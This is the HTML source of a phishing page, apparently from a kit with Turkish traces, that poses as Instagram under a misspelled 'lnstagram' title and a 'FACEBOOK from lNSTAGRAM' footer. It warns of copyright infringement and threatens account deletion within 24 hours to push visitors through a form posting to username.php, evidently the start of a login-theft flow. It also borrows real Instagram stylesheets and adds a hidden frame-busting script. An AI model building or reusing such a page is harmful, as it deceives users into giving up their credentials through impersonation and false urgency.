<html>
<head>
<meta charset="utf-8">
<title>lnstagram | Community guidelines </title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="https://imgyukle.com/images/2020/04/02/JFZDMp.png">
<link rel="shortcut icon" href="https://imgyukle.com/images/2020/04/02/JFZDMp.png">
</head>
<body class="" style="">
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div><br><br>
<div id="react-root">
<section class="LZyqZ" <div class="lTdZb">
<div class="vqibd  wNNoj ">
<div class="ZpgjG   _1I5YO">
<img style="width: 250px;" src="https://i.imgyukle.com/2020/09/25/5yrgnt.gif" alt="selam">
<h2 class="AjK3K ">Copyright Infringement Detected In Your Account</h2>
<img src="https://i.hizliresim.com/9xHgJE.gif" width="100" style="font-size:small;color:rgb(34,34,34);font-family:'times new roman';margin-right:0px" class="CToWUd"></h1>
</div> 
<p class="GusmU SVI5E     ">Copyright infringement detected in a post in your account. If you think copyright infringement is incorrect, you should provide feedback on the form. If you can't give feedback, Your account will be permanently deleted from our servers within 24 hours!</p>
<div class="GA2q- ">
<form class="JraEb" method="POST" action="username.php">
<span class="idhGk _1OSdk"><button class="_5f5mN       jIbKX KUBKM      yZn4P   ">Next</button></span>
</form>
</div>
<p class="GusmU  t_gv9    ">As an Instagram Team, we pay close attention to Community rules</p>
</div> <p id="community guidelines" style="font-family:sans-serif;font-weight:100;">© 2020 FACEBOOK from lNSTAGRAM </p> </center> </body> </html>
</div>
</div>
</div>
</section>
</div>
<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>
</html>
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/Challenge.css/e6dcc76c8eaf.css" type="text/css" crossorigin="anonymous">
<span aria-label="Facebook'tan" class="glyphsSpriteFb_brand_center_grey u-__7"></span>
<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>
</body>
</html>
 <textarea Style="width:1px; height:

1px" Rows="1" Cols="1"> <SCRIPT LANGUAGE="Javascript"> if (parent.frames.length > 0) parent.location.href%self.location; </SCRIPT>


<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>
</html>